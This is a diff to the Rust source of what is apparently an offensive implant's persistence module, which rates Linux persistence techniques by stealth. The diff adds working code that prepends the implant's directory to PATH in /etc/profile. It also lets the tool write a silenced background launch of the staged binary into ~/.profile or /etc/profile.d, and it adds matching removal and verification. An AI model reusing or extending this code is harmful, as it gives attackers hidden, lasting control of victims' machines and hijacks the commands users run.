@@ -88,6 +88,7 @@ pub fn catalogue() -> &'static [Technique] {
         Technique { id: "xdg_autostart", platform: "linux", label: "XDG autostart entry", trigger: "logon", needs_admin: false, stealth: 7 },
         Technique { id: "at", platform: "linux", label: "at job", trigger: "schedule", needs_admin: false, stealth: 5 },
         Technique { id: "profile.alias", platform: "linux", label: "Shell alias wrapper", trigger: "logon", needs_admin: false, stealth: 9 },
+        Technique { id: "profile.env", platform: "linux", label: "Environment source in /etc/profile", trigger: "logon", needs_admin: true, stealth: 7 },
         Technique { id: "systemd.execstartpre", platform: "linux", label: "systemd drop-in (ExecStartPre)", trigger: "boot", needs_admin: true, stealth: 6 },
         Technique { id: "kernel.module", platform: "linux", label: "Kernel module", trigger: "boot", needs_admin: true, stealth: 1 },
         // ---- macOS ------------------------------------------------------
@@ -924,14 +925,44 @@ fn install_technique(
             Ok((path.to_string_lossy().to_string(), format!("update-rc.d: {output}")))
         }
         "profile" => {
-            let path = home().join(".bashrc");
+            // Three places to hook the shell: the file the shell reads for an
+            // interactive session, the file it reads when the session is a
+            // login, and the directory every profile of the machine sources.
+            let which = args.str_or("file", "bashrc");
+            let path = match which.as_str() {
+                "profile" => home().join(".profile"),
+                "profile.d" => PathBuf::from("/etc/profile.d").join(format!("{}.sh", sanitise(name))),
+                _ => home().join(".bashrc"),
+            };
             let mut text = fs::read_to_string(&path).unwrap_or_default();
             let marker = format!("# {name}");
             if !text.contains(&marker) {
                 text.push_str(&format!("\n{marker}\n{staged} >/dev/null 2>&1 &\n"));
+                if let Some(parent) = path.parent() {
+                    let _ = fs::create_dir_all(parent);
+                }
                 fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
             }
             Ok((path.to_string_lossy().to_string(), "written".to_string()))
+        }
+        "profile.env" => {
+            // The environment source of the machine: the directory of the
+            // implant joins the PATH, so the program is found by its name.
+            let path = PathBuf::from("/etc/profile");
+            let marker = format!("# {name}");
+            let dir = Path::new(staged)
+                .parent()
+                .map(|p| p.to_string_lossy().to_string())
+                .unwrap_or_else(|| "/tmp".to_string());
+            let mut text = fs::read_to_string(&path).unwrap_or_default();
+            if !text.contains(&marker) {
+                text.push_str(&format!("\n{marker}\nexport PATH=\"{dir}:$PATH\"\n"));
+                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
+            }
+            Ok((
+                path.to_string_lossy().to_string(),
+                format!("the path of the session starts in {dir}"),
+            ))
         }
         "ld_preload" => {
             let path = PathBuf::from("/etc/ld.so.preload");
@@ -1151,8 +1182,8 @@ fn remove_technique(
             ));
             Ok(vec![format!("crontab: {output}")])
         }
-        "cron.d" | "rc.local" | "init.d" | "profile" | "profile.alias" | "ld_preload"
-        | "xdg_autostart" | "shell_rc" => {
+        "cron.d" | "rc.local" | "init.d" | "profile" | "profile.alias" | "profile.env"
+        | "ld_preload" | "xdg_autostart" | "shell_rc" => {
             let path = PathBuf::from(location);
             let mut text = fs::read_to_string(&path).unwrap_or_default();
             let before = text.lines().count();
@@ -1170,6 +1201,11 @@ fn remove_technique(
             }
             if id == "init.d" {
                 let _ = run(&format!("update-rc.d -f {} remove", sanitise(name)));
+            }
+            if id == "profile" && location.contains("/etc/profile.d/") {
+                // The drop-in is ours alone, so it goes away with the file.
+                let _ = fs::remove_file(&path);
+                return Ok(vec![format!("removed {}", path.display())]);
             }
             Ok(vec![format!("cleaned {}", path.display())])
         }
@@ -1311,7 +1347,8 @@ fn verify_technique(
                 Ok(("broken".to_string(), "the crontab entry is gone".to_string()))
             }
         }
-        "cron.d" | "rc.local" | "init.d" | "profile" | "ld_preload" | "xdg_autostart" | "shell_rc" => {
+        "cron.d" | "rc.local" | "init.d" | "profile" | "profile.env" | "ld_preload"
+        | "xdg_autostart" | "shell_rc" => {
             let path = PathBuf::from(location);
             let present = match fs::read_to_string(&path) {
                 Ok(text) => text.contains(binary) || text.contains(name),
